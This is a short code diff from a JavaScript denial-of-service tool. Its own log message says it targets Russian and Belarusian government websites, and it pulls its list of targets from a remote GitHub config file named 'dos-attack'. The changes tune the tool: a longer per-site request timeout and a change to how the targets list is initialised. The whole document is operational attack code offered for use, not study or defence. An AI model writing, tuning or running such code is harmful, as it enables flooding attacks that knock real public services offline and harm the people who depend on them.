@@ -6,7 +6,7 @@ axios.defaults.validateStatus = () => true
 log.level = 'INFO'
 
 const LAST_SUCCESS_RESPONSE_TIMEOUT_IN_SECONDS = 60
-const SITE_TIMEOUT_IN_MS = 2000
+const SITE_TIMEOUT_IN_MS = 3000
 const CHAR_SET = 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдеёжзийклмнопрстуфхцчшщъыьэюяABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
 const REMOTE_CONFIG_URL = 'https://raw.githubusercontent.com/JetDeveloper/dos-attack/main/config.json'
 
@@ -34,7 +34,7 @@ async function main () {
   log.info('Starting to DoS russian/belarusian gov sites')
   log.info('Trying to get remote URL list...')
 
-  let targets = []
+  let targets
   try {
     const response = await axios(REMOTE_CONFIG_URL)
     targets = response.data.targets
